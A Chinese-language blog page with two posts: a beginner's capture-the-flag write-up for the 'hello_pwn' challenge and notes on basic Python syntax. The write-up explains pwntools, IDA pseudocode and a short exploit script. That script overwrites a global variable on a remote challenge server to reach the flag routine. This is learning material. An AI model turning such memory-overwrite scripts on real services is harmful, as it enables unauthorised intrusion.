<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="你们这样对得起孤胆英雄飞天狙吗">
<meta property="og:url" content="http://example.com/page/18/index.html">
<meta property="og:site_name" content="你们这样对得起孤胆英雄飞天狙吗">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="冲击波">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/page/18/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/18/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>你们这样对得起孤胆英雄飞天狙吗</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">你们这样对得起孤胆英雄飞天狙吗</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">冲击波</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">184</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/18/AD-hello-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/18/AD-hello-pwn/" class="post-title-link" itemprop="url">AD_hello_pwn</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-18 18:54:01" itemprop="dateCreated datePublished" datetime="2020-12-18T18:54:01+08:00">2020-12-18</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-03-14 10:33:48" itemprop="dateModified" datetime="2021-03-14T10:33:48+08:00">2021-03-14</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <img src="/2020/12/18/AD-hello-pwn/1.jpg" class>
<p>诶呀。。。。。。 没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。 诶呀，恶心啊。。。。</p>
<p>#Pwntools主要模块及其使用 <strong>Tubes模块包含remote和process子模块</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">32152</span>)</span><br><span class="line"><span class="comment"># 与互联网主机交互</span></span><br><span class="line">io.sendline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># sendline发送数据会在最后多添加一个回车</span></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># recv()读取1024个字节，revuntil()读取到指定数据，recvline()会读取一直到回车</span></span><br><span class="line">io.interactive() <span class="comment">#爷不晓得</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure>
<p>之前昨天速成python是在本机VS2019（我现在还没找到解释器），现在去VMLinux写。</p>
<p>太懒了，不下IDE了</p>
<p><strong>新建文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; text.py</span><br></pre></td></tr></table></figure>
<p>右键修改权限后可执行</p>
<h1 id="做题">做题</h1>
<p>本题附件用于反编译，查找漏洞，然后写脚本，用脚本连接对准环境直接攻击（我拿着脚本对附件打了半天）</p>
<img src="/2020/12/18/AD-hello-pwn/3.jpg" class>
<p>把附件先扔到IDA反编译</p>
<img src="/2020/12/18/AD-hello-pwn/2.png" class>
<p>你要是不晓得这是啥玩意，巧了，我也不知道</p>
<p>写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#导入pwntools的工具，我一开始在导入附件，别骂了</span></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bof&quot;</span>) <span class="comment">#读取到指定数据</span></span><br><span class="line">io.sendline(payload) <span class="comment">#发送数据</span></span><br><span class="line">io.interactive() <span class="comment">#爷不懂得</span></span><br></pre></td></tr></table></figure>
<p>运行脚本，成功</p>
<p><strong>爷太菜了，爷滚去看汇编了</strong></p>
<p><strong>······</strong></p>
<p><strong>一目十行速成汇编，我胡汉三又回来了</strong></p>
<p>附件扔IDA，找到main得到一个结构</p>
<img src="/2020/12/18/AD-hello-pwn/1.png" class>
<p>反汇编得到一段伪c代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&quot;~~ welcome to ctf ~~     &quot;);</span><br><span class="line">  puts(&quot;lets get helloworld for bof&quot;);</span><br><span class="line">  read(0, &amp;unk_601068, 0x10uLL);</span><br><span class="line">  if ( dword_60106C == 1853186401 )</span><br><span class="line">    sub_400686();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码里面有read函数，上网去找C语言read()函数的用法</p>
<p>从文件中读取指定大小的字节函数read()</p>
<p>原型：<code>ssize_t read(int fd,void*buf,size_t count)</code> 参数说明： fd: 是文件描述符，对应0 buf: 为读出数据的缓冲区 count: 为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移） 总结：read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲区中。</p>
<p>返回值: 若读取失败则返回-1。 读取成功则返回实际读取到的字节数,有两种情况: [1].读取到的字节数小于count,这是在读取的文件的总字节数小于count。 [2].若读取到的字节数等于count,则在读取的文件的总字节数不小于count时发生。 注意:读取到的字节存放在buf缓冲区中,必须最后加上一个字节'\0'才能组成一个字符串</p>
<p>回到题目 第一个参数为0，代表标准输入即从终端输入，第三个参数是输入的个数是0x10（uLL是unsigned long long），即16个字节。 将数据读到&amp;unk_601068（我猜）</p>
<p>双击&amp;unk_601068和dword_60106C，IDA跳转到另一页面（IDA开始香了） <img src="/2020/12/18/AD-hello-pwn/4.png" class></p>
<p>双击sub_400686()，跳转到： <img src="/2020/12/18/AD-hello-pwn/5.png" class> 芜湖起飞</p>
<p>也就是说只要dword_60106C=1853186401，就能拿到flag</p>
<p>现在再看脚本了 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get hello world for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure></p>
<p>没有人比我更懂速成</p>
<h1 id="ida反编译汇编源代码复盘">IDA反编译汇编源代码复盘</h1>
<p><strong>start 先于 main</strong></p>
<p><strong>段寄存器说明语句</strong> 在汇编语言源程序中可以定义多个段，每个段都要与一个段寄存器建立一种对应关系。建立这种对应关系的说明语句格式如下：</p>
<p>assume 段寄存器名:段名[, 段寄存器名:段名, ……]</p>
<p>其中：段寄存器是CS、DS、ES、SS、FS和GS，段名是在段定义语句说明时的段名。</p>
<p>在一条assume语句中可建立多组段寄存器与段之间的关系，每种对应关系要用逗号分隔。例如，</p>
<p>assume CS:code1, DS:data1</p>
<p>上面的语句说明了：CS对应于代码段code1，DS对应于数据段data1。</p>
<p>在assume语句中，还可以用关键字nothing来说明某个段寄存器不与任何段相对应。下面语句说明了段寄存器ES不与某段相对应。</p>
<p>assume ES:nothing</p>
<p>在通常情况下，代码段的第一条语句就是用assume语句来说明段寄存器与段之间的对应关系。在代码段的其它位置，还可以用另一个assume语句来改变前面assume语句所说明的对应关系，这样，代码段中的指令就用最近的assume语句所建立的对应关系来确定指令中的有关信息。</p>
<p><strong>跨段寻址</strong> 偶尔需要存取默认段以外的操作数，就要使用操作数段前缀。如， mov ax,es:[si] 这条指令告诉cpu：要读取的数据不在当前数据段，而在附加段的si所指的地址。</p>
<p><strong>segment</strong></p>
<p>[格式] segment_name SEGMENT [定位类型] [组合类型] [类别名] ···;here is your code segment ends</p>
<p>参数解释:</p>
<p>[定位类型] 指明段开始的边界，如para，它使段定位在小段的边界，段首地址正好能被16整除，定位类型未指定时默认为para 段的定位类型有4种，分别是： page(页起始)，起始地址以00H结尾，能被256整除 para (节起始)，起始地址以0H结尾，能被16整除 word(字起始)，起始地址末位为0，是偶地址 byte (字节起始)，起始地址为任意边界</p>
<p>[组合类型] 决定本段是否要和其他段组合在一起，组合类型有：stack，common，public</p>
<p>[类别名] 连接时用于相关段组合在一起，如代码段’code’，数据段’Data’，堆栈段’Stack’</p>
<p>例子: stack segment para stack ‘stack’ 解释: para表明该段起始地址对齐到para。 1 para= 16 bytes。stack声明该段是堆栈段，这样在最后的链接link时，会将该最终创建的exe文件头部的SS：SP域指向该段的末尾 ‘stack’表明该段的组合名为’stack’。同一程序不同模块中，相同组合名的段会组合到一起。组合名也决定了最后exe文件中各个段的排列顺序</p>
<p><strong>hlt</strong> HLT是暂停指令，当计算机程序运行一条HLT指令的时候，处理器就会进入传统的暂停模式。bai部的时钟信号停止下来了。在收到中断指令后，处理器又可以回到正常运作形态，同时时钟信号也恢复正常。</p>
<p><strong>栈堆相关寄存器</strong> 运行时堆栈是内存数组，CPU用ESP寄存器（堆栈指针寄存器），对其进行管理。 ESP存放的是堆栈中某个位置的32位偏移量，每个堆栈位置都是32位长。 对应64位下的rsp（低位为esp）</p>
<p>几个常用的寄存器 sp/esp/rsp（16bit/32bit/64bit）栈寄存器---指向栈顶 bp/ebp/rbp 栈基址寄存器---指向栈底 ip/eip/rip 程序指令寄存器---指向下一条待执行指令</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/17/python/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/17/python/" class="post-title-link" itemprop="url">python</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-17 19:19:48" itemprop="dateCreated datePublished" datetime="2020-12-17T19:19:48+08:00">2020-12-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-03-07 18:15:06" itemprop="dateModified" datetime="2022-03-07T18:15:06+08:00">2022-03-07</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>环境 本机VS2019集成 虚拟机Linux集成 遇到问题 VS2019：中文输出乱码。 解决：在左上角文件选项中添加高级保存选项，改变编码格式为简体中文(GB2312) - 代码页 936。但任然要在代码中写# coding=utf-8。成功运行，没有乱码，有警告，但如果我把编码格式改为utf，又会出乱码。 <img src="/2020/12/17/python/1.jpg" class></p>
<h1 id="基础语法">基础语法</h1>
<p>Python 可以同一行显示多条语句，方法是用分号 ; 分开 <code>print ('hello');print ('runoob');</code> Python语句中一般以新行作为语句的结束符。但是可以使用斜杠（ ）将一行的语句分为多行显示 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">total =	item_one + \</span><br><span class="line">		item_two + \</span><br><span class="line">		item_three</span><br></pre></td></tr></table></figure> ## <strong>python引号</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word = <span class="string">&#x27;word&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落。</span></span><br><span class="line"><span class="string">包含了多个语句&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="注释"><strong>注释</strong></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> 这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string"> 这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string"> 这是多行注释，使用单引号。</span></span><br><span class="line"><span class="string"> &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> 这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string"> 这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string"> 这是多行注释，使用双引号。</span></span><br><span class="line"><span class="string"> &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="print-输出与输入"><strong>print 输出</strong>与输入</h2>
<p>print 默认输出完后是换行的，同一个print内的变量自动加空格 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print (1, 2, end=&#x27; &#x27;) </span><br></pre></td></tr></table></figure> end=这里可以自己定义一整个print输出完后跟着什么</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = input()</span><br></pre></td></tr></table></figure>
<p>input输入的为字符串，可以在输入完后进行类型转换</p>
<h2 id="python-中的变量赋值不需要类型声明"><strong>Python 中的变量赋值不需要类型声明。</strong></h2>
<p>每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。 每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</p>
<h2 id="python有五个标准的数据类型"><strong>Python有五个标准的数据类型：</strong></h2>
<p>Numbers（数字） String（字符串） List（列表） Tuple（元组） Dictionary（字典）</p>
<p>其中Python支持四种不同的数字类型： - int（有符号整型） - long（长整型[也可以代表八进制和十六进制]）<br>
- float（浮点型）<br>
- complex（复数）</p>
<p>注：Python 还支持复数，复数由实数部分和虚数部分构成，可以用 a + bj,或者 complex(a,b) 表示， 复数的实部 a 和虚部 b 都是浮点型。 long 类型只存在于 Python2.X 版本中，在 2.2 以后的版本中，int 类型数据溢出后会自动转为long类型。在 Python3.X 版本中 long 类型被移除，使用 int 替代。</p>
<h2 id="字符串"><strong>字符串</strong></h2>
<p>python的字串列表有2种取值顺序: 从左到右索引默认0开始的 从右到左索引默认-1开始的 <img src="/2020/12/17/python/2.png" class></p>
<p>从字符串中获取一段子字符串，可以使用 [头下标:尾下标] 来截取相应的字符串，其中下标是从 0 开始算起，可以是正数、负数，下标可以为空表示取到头或尾。</p>
<p>[头下标:尾下标] 获取的子字符串包含头下标的字符，但不包含尾下标的字符。</p>
<p>比如:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;abcdef&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line"><span class="string">&#x27;bcde&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="列表"><strong>列表</strong></h2>
<p>创建的时候写明[] 其余同字符串 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">numbers=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">l=<span class="built_in">len</span>(numbers)</span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line">number=numbers.pop();</span><br><span class="line"><span class="built_in">print</span> number</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">range</span>(<span class="number">6</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="python-字典"><strong>Python 字典</strong></h2>
<p>字典(dictionary)是除列表以外python之中最灵活的内置数据结构类型。列表是有序的对象集合，字典是无序的对象集合。 两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。 字典用"{ }"标识。字典由索引(key)和它对应的值value组成。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"><span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>] = <span class="string">&quot;This is one&quot;</span></span><br><span class="line"><span class="built_in">dict</span>[<span class="number">2</span>] = <span class="string">&quot;This is two&quot;</span></span><br><span class="line"> </span><br><span class="line">tinydict = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;runoob&#x27;</span>,<span class="string">&#x27;code&#x27;</span>:<span class="number">6734</span>, <span class="string">&#x27;dept&#x27;</span>: <span class="string">&#x27;sales&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="string">&#x27;one&#x27;</span>]          <span class="comment"># 输出键为&#x27;one&#x27; 的值</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dict</span>[<span class="number">2</span>]              <span class="comment"># 输出键为 2 的值</span></span><br><span class="line"><span class="built_in">print</span> tinydict             <span class="comment"># 输出完整的字典</span></span><br><span class="line"><span class="built_in">print</span> tinydict.keys()      <span class="comment"># 输出所有键</span></span><br><span class="line"><span class="built_in">print</span> tinydict.values()    <span class="comment"># 输出所有值</span></span><br></pre></td></tr></table></figure>
<h2 id="python数据类型转换见到再说"><strong>Python数据类型转换</strong>（见到再说）</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = int(n)</span><br><span class="line">n = float(n)</span><br><span class="line">n = str(n)</span><br></pre></td></tr></table></figure>
<h2 id="python算术运算符其中比较不同的"><strong>Python算术运算符</strong>（其中比较不同的）</h2>
<table>
<colgroup>
<col style="width: 50%">
<col style="width: 50%">
</colgroup>
<thead>
<tr class="header">
<th><span class="math inline">\(**\)</span></th>
<th>幂 - 返回x的y次幂</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>//</td>
<td>整除</td>
</tr>
<tr class="even">
<td>in</td>
<td>如果在指定的序列中找到值返回 True，否则返回 False。</td>
</tr>
<tr class="odd">
<td>is</td>
<td>is 是判断两个标识符是不是引用自一个对象（is 与 == 区别：is 用于判断两个变量引用对象是否为同一个(同一块内存空间)， == 用于判断引用变量的值是否相等。）</td>
</tr>
</tbody>
</table>
<h2 id="if"><strong>if</strong></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> num &lt; <span class="number">0</span> <span class="keyword">or</span> num &gt; <span class="number">10</span>:    <span class="comment"># 判断值是否在小于0或大于10</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;undefine&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="循环"><strong>循环</strong></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> iterating_var <span class="keyword">in</span> sequence:</span><br><span class="line">   statements(s)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for i in range(6):</span><br><span class="line">	print i</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0</span><br><span class="line">&gt;&gt;&gt; 1</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line">&gt;&gt;&gt; 3</span><br><span class="line">&gt;&gt;&gt; 4</span><br><span class="line">&gt;&gt;&gt; 5</span><br></pre></td></tr></table></figure>
<h2 id="pass"><strong>pass</strong></h2>
<p>一般用于占位置。 在 Python 中有时候会看到一个 def 函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sample</span>(<span class="params">n_samples</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>该处的 pass 便是占据一个位置，因为如果定义一个空函数程序会报错，当你没有想好函数的内容是可以用 pass 填充，使程序可以正常运行。</p>
<h2 id="python-math-模块cmath-模块"><strong>Python math 模块、cmath 模块</strong></h2>
